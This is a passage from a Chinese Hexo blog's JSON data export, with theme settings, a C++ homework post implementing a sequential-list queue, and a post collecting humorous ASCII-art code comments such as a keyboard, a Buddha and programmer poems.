google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1403,"excerpt":"<h1 id=\"顺序表队列\"><a href=\"#顺序表队列\" class=\"headerlink\" title=\"顺序表队列\"></a>顺序表队列</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br>","more":"<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAXSIZE 100</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> OK 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> ERROR 0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> OVERFLOW 2</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> Status;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> ElemType;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">node</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> num;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    node *elem;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> length;</span><br><span class=\"line\">&#125;SqList;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">InitQueue</span><span class=\"params\">(SqList &amp;L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    L.elem=<span class=\"keyword\">new</span> node[MAXSIZE];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!L.elem)<span class=\"built_in\">exit</span>(OVERFLOW);</span><br><span class=\"line\">    L.length=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">QueueShow</span><span class=\"params\">(SqList &amp;L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;L.length;i++)</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;L.elem[i].num&lt;&lt;<span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">EnQueue</span><span class=\"params\">(SqList &amp;L,node e)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(L.length==MAXSIZE)<span class=\"keyword\">return</span> ERROR;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        L.elem[L.length]=e;</span><br><span class=\"line\">        ++L.length;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> OK;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">DeQueue</span><span class=\"params\">(SqList &amp;L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">        L.elem[i<span class=\"number\">-1</span>]=L.elem[i];</span><br><span class=\"line\">    L.length--;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">menu</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;1.EnQueue&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;2.DeQueue&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;0.Exit&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    SqList L;</span><br><span class=\"line\">    node e;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a,n;</span><br><span class=\"line\">    InitQueue(L);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        system(<span class=\"string\">&quot;CLS&quot;</span>);</span><br><span class=\"line\">        menu();</span><br><span class=\"line\">        QueueShow(L);</span><br><span class=\"line\">        <span class=\"built_in\">cin</span>&gt;&gt;a;</span><br><span class=\"line\">        getchar();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(a==<span class=\"number\">1</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;Please Input Number To Be Insert:&quot;</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cin</span>&gt;&gt;n;getchar();</span><br><span class=\"line\">            e.num=n;</span><br><span class=\"line\">            EnQueue(L,e);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(a==<span class=\"number\">2</span>)DeQueue(L);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(a==<span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"那些有趣的注释","date":"2020-04-08T08:08:24.000Z","abbrlink":"2626d8b6","_content":"> **标准键盘**\n\n```nohilight\n/**\n * ┌───┐   ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┐\n * │Esc│   │ F1│ F2│ F3│ F4│ │ F5│ F6│ F7│ F8│ │ F9│F10│F11│F12│ │P/S│S L│P/B│  ┌┐    ┌┐    ┌┐\n * └───┘   └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┘  └┘    └┘    └┘\n * ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───────┐ ┌───┬───┬───┐ ┌───┬───┬───┬───┐\n * │~ `│! 1│@ 2│# 3│$ 4│% 5│^ 6│& 7│* 8│( 9│) 0│_ -│+ =│ BacSp │ │Ins│Hom│PUp│ │N L│ / │ * │ - │\n * ├───┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─────┤ ├───┼───┼───┤ ├───┼───┼───┼───┤\n * │ Tab │ Q │ W │ E │ R │ T │ Y │ U │ I │ O │ P │{ [│} ]│ | \\ │ │Del│End│PDn│ │ 7 │ 8 │ 9 │   │\n * ├─────┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴─────┤ └───┴───┴───┘ ├───┼───┼───┤ + │\n * │ Caps │ A │ S │ D │ F │ G │ H │ J │ K │ L │: ;│\" '│ Enter  │               │ 4 │ 5 │ 6 │   │\n * ├──────┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴────────┤     ┌───┐     ├───┼───┼───┼───┤\n * │ Shift  │ Z │ X │ C │ V │ B │ N │ M │< ,│> .│? /│  Shift   │     │ ↑ │     │ 1 │ 2 │ 3 │   │\n * ├─────┬──┴─┬─┴──┬┴───┴───┴───┴───┴───┴──┬┴───┼───┴┬────┬────┤ ┌───┼───┼───┐ ├───┴───┼───┤ E││\n * │ Ctrl│    │Alt │         Space         │ Alt│    │    │Ctrl│ │ ← │ ↓ │ → │ │   0   │ . │←─┘│\n * └─────┴────┴────┴───────────────────────┴────┴────┴────┴────┘ └───┴───┴───┘ └───────┴───┴───┘\n */\n```\n\n<!--more-->\n> **PC**\n\n```nohilght\n+------------------------------------------------------------------------+\n|                                                                        |\n|  +------------------------------------------------------------------+  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  |                                                                  |  |\n|  +------------------------------------------------------------------+  |\n|        f0    f1    f2    f3    f4    f5    f6    f7    f8    f9        |\n+------------------------------------------------------------------------+\n|                                                                        |\n|  [f0]  [f1]  [f2]  [f3]  [f4]  [f5]  [f6]  [f7]  [f8]  [f9]   [On/Off] |\n|                                                                        |\n|     [Q]  [W]  [E]  [R]  [T]  [Y]  [U]  [I]  [O]  [P]   [<] [^] [v] [^] |\n|                                                                        |\n|     [Q]  [W]  [E]  [R]  [T]  [Y]  [U]  [I]  [O]  [P]   [7] [8] [9] [/] |\n|                                                                        |\n|       [A]  [S]  [D]  [F]  [G]  [H]  [J]  [K]  [L]      [4] [5] [6] [*] |\n|                                                                        |\n|  [CTRL]  [Z]  [X]  [C]  [V]  [B]  [N]  [M]  [ ENTER ]  [1] [2] [3] [-] |\n|                                                                        |\n|  [SHIFT]  [ALT]   [    space    ]   [,]  [.]  [SHIFT]  [0] [.] [=] [+] |\n|                                                                        |\n+------------------------------------------------------------------------+\n```\n\n> **佛祖保佑，永无BUG\n\n```nohilight\n//                            _ooOoo_    \n//                           o8888888o    \n//                           88\" . \"88    \n//                           (| -_- |)    \n//                            O\\ = /O    \n//                        ____/`---'\\____    \n//                      .   ' \\\\| |// `.    \n//                       / \\\\||| : |||// \\    \n//                     / _||||| -:- |||||- \\    \n//                       | | \\\\\\ - /// | |    \n//                     | \\_| ''\\---/'' | |    \n//                      \\ .-\\__ `-` ___/-. /    \n//                   ___`. .' /--.--\\ `. . __    \n//                .\"\" '< `.___\\_<|>_/___.' >'\"\".    \n//               | | : `- \\`.;`\\ _ /`;.`/ - ` : | |    \n//                 \\ \\ `-. \\_ __\\ /__ _/ .-` / /    \n//         ======`-.____`-.___\\_____/___.-`____.-'======    \n//                            `=---='    \n//    \n//         .............................................    \n//                  佛祖保佑             永无BUG\n```\n\n> **神兽护体，永无BUG\n\n```nohilight\n// ┏┓　　　┏┓\n// ┏┛┻━━━┛┻┓\n// ┃　　　　　　　┃ 　\n// ┃　　　━　　　┃\n// ┃　┳┛　┗┳　┃\n// ┃　　　　　　　┃\n// ┃　　　┻　　　┃\n// ┃　　　　　　　┃\n// ┗━┓　　　┏━┛\n// ┃　　　┃ Code is far away from bug with the animal protecting　　　　　　　　\n// ┃　　　┃ 神兽保护，永无BUG！\n// ┃　　　┗━━━┓\n// ┃　　　　　　　┣┓\n// ┃　　　　　　　┏┛\n// ┗┓┓┏━┳┓┏┛\n// ┃┫┫　┃┫┫\n// ┗┻┛　┗┻┛\n```\n\n```nohilight\n/**\n *　　　　　　　　┏┓　　　┏┓+ +\n *　　　　　　　┏┛┻━━━┛┻┓ + +\n *　　　　　　　┃　　　　　　　┃ 　\n *　　　　　　　┃　　　━　　　┃ ++ + + +\n *　　　　　　 ████━████ ┃+\n *　　　　　　　┃　　　　　　　┃ +\n *　　　　　　　┃　　　┻　　　┃\n *　　　　　　　┃　　　　　　　┃ + +\n *　　　　　　　┗━┓　　　┏━┛\n *　　　　　　　　　┃　　　┃　　　　　　　　　　　\n *　　　　　　　　　┃　　　┃ + + + +\n *　　　　　　　　　┃　　　┃　Code is far away from bug with the animal protecting　　　　　　　\n *　　　　　　　　　┃　　　┃ + 神兽保佑,永无bug　　\n *　　　　　　　　　┃　　　┃\n *　　　　　　　　　┃　　　┃　　+　　　　　　　　　\n *　　　　　　　　　┃　 　　┗━━━┓ + +\n *　　　　　　　　　┃ 　　　　　　　┣┓\n *　　　　　　　　　┃ 　　　　　　　┏┛\n *　　　　　　　　　┗┓┓┏━┳┓┏┛ + + + +\n *　　　　　　　　　　┃┫┫　┃┫┫\n *　　　　　　　　　　┗┻┛　┗┻┛+ + + +\n */\n```\n\n> **程序员打油诗**\n\n```nohilight\n/**\n *                      江城子 . 程序员之歌\n *\n *                  十年生死两茫茫，写程序，到天亮。\n *                      千行代码，Bug何处藏。\n *                  纵使上线又怎样，朝令改，夕断肠。\n *\n *                  领导每天新想法，天天改，日日忙。\n *                      相顾无言，惟有泪千行。\n *                  每晚灯火阑珊处，夜难寐，加班狂。\n*/\n```\n\n```nohilight\n/**\n *          写字楼里写字间，写字间里程序员；\n *          程序人员写程序，又拿程序换酒钱。\n *          酒醒只在网上坐，酒醉还来网下眠；\n *          酒醉酒醒日复日，网上网下年复年。\n *          但愿老死电脑间，不愿鞠躬老板前；\n *          奔驰宝马贵者趣，公交自行程序员。\n *          别人笑我忒疯癫，我笑自己命太贱；\n *          不见满街漂亮妹，哪个归得程序员？\n */\n```\n\n> **单身狗**\n\n```nohilight\n<!--\n                       ::\n                      :;J7, :,                        ::;7:\n                      ,ivYi, ,                       ;LLLFS:\n                      :iv7Yi                       :7ri;j5PL\n                     ,:ivYLvr                    ,ivrrirrY2X,\n                     :;r@Wwz.7r:                :ivu@kexianli.\n                    :iL7::,:::iiirii:ii;::::,,irvF7rvvLujL7ur\n                   ri::,:,::i:iiiiiii:i:irrv177JX7rYXqZEkvv17\n                ;i:, , ::::iirrririi:i:::iiir2XXvii;L8OGJr71i\n              :,, ,,:   ,::ir@mingyi.irii:i:::j1jri7ZBOS7ivv,\n                 ,::,    ::rv77iiiriii:iii:i::,rvLq@huhao.Li\n             ,,      ,, ,:ir7ir::,:::i;ir:::i:i::rSGGYri712:\n           :::  ,v7r:: ::rrv77:, ,, ,:i7rrii:::::, ir7ri7Lri\n          ,     2OBBOi,iiir;r::        ,irriiii::,, ,iv7Luur:\n        ,,     i78MBBi,:,:::,:,  :7FSL: ,iriii:::i::,,:rLqXv::\n        :      iuMMP: :,:::,:ii;2GY7OBB0viiii:i:iii:i:::iJqL;::\n       ,     ::::i   ,,,,, ::LuBBu BBBBBErii:i:i:i:i:i:i:r77ii\n      ,       :       , ,,:::rruBZ1MBBqi, :,,,:::,::::::iiriri:\n     ,               ,,,,::::i:  @arqiao.       ,:,, ,:::ii;i7:\n    :,       rjujLYLi   ,,:::::,:::::::::,,   ,:i,:,,,,,::i:iii\n    ::      BBBBBBBBB0,    ,,::: , ,:::::: ,      ,,,, ,,:::::::\n    i,  ,  ,8BMMBBBBBBi     ,,:,,     ,,, , ,   , , , :,::ii::i::\n    :      iZMOMOMBBM2::::::::::,,,,     ,,,,,,:,,,::::i:irr:i:::,\n    i   ,,:;u0MBMOG1L:::i::::::  ,,,::,   ,,, ::::::i:i:iirii:i:i:\n    :    ,iuUuuXUkFu7i:iii:i:::, :,:,: ::::::::i:i:::::iirr7iiri::\n    :     :rk@Yizero.i:::::, ,:ii:::::::i:::::i::,::::iirrriiiri::,\n     :      5BMBBBBBBSr:,::rv2kuii:::iii::,:i:,, , ,,:,:i@petermu.,\n          , :r50EZ8MBBBBGOBBBZP7::::i::,:::::,: :,:,::i;rrririiii::\n              :jujYY7LS0ujJL7r::,::i::,::::::::::::::iirirrrrrrr:ii:\n           ,:  :@kevensun.:,:,,,::::i:i:::::,,::::::iir;ii;7v77;ii;i,\n           ,,,     ,,:,::::::i:iiiii:i::::,, ::::iiiir@xingjief.r;7:i,\n        , , ,,,:,,::::::::iiiiiiiiii:,:,:::::::::iiir;ri7vL77rrirri::\n         :,, , ::::::::i:::i:::i:i::,,,,,:,::i:i:::iir;@Secbone.ii:::\n\n-->\n```\n\n> **骷髅头**\n\n```nohilight\n/**\n **************************************************************\n *                                                            *\n *   .=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-.       *\n *    |                     ______                     |      *\n *    |                  .-\"      \"-.                  |      *\n *    |                 /            \\                 |      *\n *    |     _          |              |          _     |      *\n *    |    ( \\         |,  .-.  .-.  ,|         / )    |      *\n *    |     > \"=._     | )(__/  \\__)( |     _.=\" <     |      *\n *    |    (_/\"=._\"=._ |/     /\\     \\| _.=\"_.=\"\\_)    |      *\n *    |           \"=._\"(_     ^^     _)\"_.=\"           |      *\n *    |               \"=\\__|IIIIII|__/=\"               |      *\n *    |              _.=\"| \\IIIIII/ |\"=._              |      *\n *    |    _     _.=\"_.=\"\\          /\"=._\"=._     _    |      *\n *    |   ( \\_.=\"_.=\"     `--------`     \"=._\"=._/ )   |      *\n *    |    > _.=\"                            \"=._ <    |      *\n *    |   (_/                                    \\_)   |      *\n *    |                                                |      *\n *    '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='      *\n *                                                            *\n *           LASCIATE OGNI SPERANZA, VOI CH'ENTRATE           *\n **************************************************************\n */\n```\n\n> **顶**\n\n```nohilight\n/**\n * 頂頂頂頂頂頂頂頂頂　頂頂頂頂頂頂頂頂頂\n * 頂頂頂頂頂頂頂　　　　　頂頂　　　　　\n * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂\n * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂\n * 　　　頂頂　　　頂頂　　　　　　　頂頂\n * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂\n * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂\n * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂\n * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂\n * 　　　頂頂　　　　　　　頂頂頂　\n * 　　　頂頂　　　　　　頂頂　頂頂　頂頂\n * 　頂頂頂頂　　　頂頂頂頂頂　頂頂頂頂頂\n * 　頂頂頂頂　　　頂頂頂頂　　　頂頂頂頂\n */\n```\n\n> **BUG泛滥，我已瘫痪\n\n```nohilight\n/**\n * _ooOoo_\n * o8888888o\n * 88\" . \"88\n * (| -_- |)\n *  O\\ = /O\n * ___/`---'\\____\n * .   ' \\\\| |// `.\n * / \\\\||| : |||// \\\n * / _||||| -:- |||||- \\\n * | | \\\\\\ - /// | |\n * | \\_| ''\\---/'' | |\n * \\ .-\\__ `-` ___/-. /\n * ___`. .' /--.--\\ `. . __\n * .\"\" '< `.___\\_<|>_/___.' >'\"\".\n * | | : `- \\`.;`\\ _ /`;.`/ - ` : | |\n * \\ \\ `-. \\_ __\\ /__ _/ .-` / /\n * ======`-.____`-.___\\_____/___.-`____.-'======\n * `=---='\n * .............................................\n * 佛曰：bug泛滥，我已瘫痪！\n */\n```\n\n> **啪**\n\n```nohilight\n/**\n *                                         ,s555SB@@&                          \n *                                      :9H####@@@@@Xi                        \n *                                     1@@@@@@@@@@@@@@8                       \n *                                   ,8@@@@@@@@@B@@@@@@8                      \n *                                  :B@@@@X3hi8Bs;B@@@@@Ah,                   \n *             ,8i                  r@@@B:     1S ,M@@@@@@#8;                 \n *            1AB35.i:               X@@8 .   SGhr ,A@@@@@@@@S                \n *            1@h31MX8                18Hhh3i .i3r ,A@@@@@@@@@5               \n *            ;@&i,58r5                 rGSS:     :B@@@@@@@@@@A               \n *             1#i  . 9i                 hX.  .: .5@@@@@@@@@@@1               \n *              sG1,  ,G53s.              9#Xi;hS5 3B@@@@@@@B1                \n *               .h8h.,A@@@MXSs,           #@H1:    3ssSSX@1                  \n *               s ,@@@@@@@@@@@@Xhi,       r#@@X1s9M8    .GA981               \n *               ,. rS8H#@@@@@@@@@@#HG51;.  .h31i;9@r    .8@@@@BS;i;          \n *                .19AXXXAB@@@@@@@@@@@@@@#MHXG893hrX#XGGXM@@@@@@@@@@MS        \n *                s@@MM@@@hsX#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&,      \n *              :GB@#3G@@Brs ,1GM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B,     \n *            .hM@@@#@@#MX 51  r;iSGAM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8     \n *          :3B@@@@@@@@@@@&9@h :Gs   .;sSXH@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:    \n *      s&HA#@@@@@@@@@@@@@@M89A;.8S.       ,r3@@@@@@@@@@@@@@@@@@@@@@@@@@@r    \n *   ,13B@@@@@@@@@@@@@@@@@@@5 5B3 ;.         ;@@@@@@@@@@@@@@@@@@@@@@@@@@@i    \n *  5#@@#&@@@@@@@@@@@@@@@@@@9  .39:          ;@@@@@@@@@@@@@@@@@@@@@@@@@@@;    \n *  9@@@X:MM@@@@@@@@@@@@@@@#;    ;31.         H@@@@@@@@@@@@@@@@@@@@@@@@@@:    \n *   SH#@B9.rM@@@@@@@@@@@@@B       :.         3@@@@@@@@@@@@@@@@@@@@@@@@@@5    \n *     ,:.   9@@@@@@@@@@@#HB5                 .M@@@@@@@@@@@@@@@@@@@@@@@@@B    \n *           ,ssirhSM@&1;i19911i,.             s@@@@@@@@@@@@@@@@@@@@@@@@@@S   \n *              ,,,rHAri1h1rh&@#353Sh:          8@@@@@@@@@@@@@@@@@@@@@@@@@#:  \n *            .A3hH@#5S553&@@#h   i:i9S          #@@@@@@@@@@@@@@@@@@@@@@@@@A. \n *\n *\n *   \n */\n```\n\n**[Click Here For More](http://www.asciiworld.com/)**","source":"_posts/那些有趣的注释.md","raw":"---\ntitle: 那些有趣的注释\ndate: 2020-04-08 16:08:24\ncategories:\n  - 编程语言\nabbrlink: 2626d8b6\n---\n> **标准键盘**\n\n```nohilight\n/**\n * ┌───┐   ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┐\n * │Esc│   │ F1│ F2│ F3│ F4│ │ F5│ F6│ F7│ F8│ │ F9│F10│F11│F12│ │P/S│S L│P/B│  ┌┐    ┌┐    ┌┐\n * └───┘   └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┘  └┘    └┘    └┘\n * ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───────┐ ┌───┬───┬───┐ ┌───┬───┬───┬───┐\n * │~ `│! 1│@ 2│# 3│$ 4│% 5│^ 6│& 7│* 8│( 9│) 0│_ -│+ =│ BacSp │ │Ins│Hom│PUp│ │N L│ / │ * │ - │\n * ├───┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─────┤ ├───┼───┼───┤ ├───┼───┼───┼───┤\n * │ Tab │ Q │ W │ E │ R │ T │ Y │ U │ I │ O │ P │{ [│} ]│ | \\ │ │Del│End│PDn│ │ 7 │ 8 │ 9 │   │\n * ├─────┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴─────┤ └───┴───┴───┘ ├───┼───┼───┤ + │\n * │ Caps │ A │ S │ D │ F │ G │ H │ J │ K │ L │: ;│\" '│ Enter  │               │ 4 │ 5 │ 6 │   │\n * ├──────┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴────────┤     ┌───┐     ├───┼───┼───┼───┤\n * │ Shift  │ Z │ X │ C │ V │ B │ N │ M │< ,│> .│? /│  Shift   │     │ ↑ │     │ 1 │ 2 │ 3 │   │\n * ├─────┬──┴─┬─┴──┬┴───┴───┴───┴───┴───┴──┬┴───┼───┴┬────┬────┤ ┌───┼───┼───┐ ├───┴───┼───┤ E││\n * │ Ctrl│    │Alt │         Space         │ Alt│    │    │Ctrl│ │ ← │ ↓ │ → │ │   0   │ . │←─┘│\n * └─────┴────┴────┴───────────────────────┴────┴────┴────┴────┘ └───┴───┴───┘ └───────┴───┴───┘\n */\n```\n\n<!--more-->\n> **PC**\n\n```nohilght\n+------------------------------------------------------------------------+\n|                                                                        |\n|  